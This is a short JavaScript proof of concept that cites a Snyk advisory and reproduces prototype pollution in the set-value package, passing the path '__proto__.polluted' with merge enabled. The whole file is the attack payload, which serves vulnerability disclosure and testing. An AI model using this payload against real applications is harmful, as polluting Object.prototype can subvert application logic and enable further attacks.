//https://snyk.io/vuln/SNYK-JS-SETVALUE-450213
const setFn = require('set-value');

Object.prototype._polluted = {};
setFn({}, '__proto__.polluted', {prop: "yes"}, {merge: true});
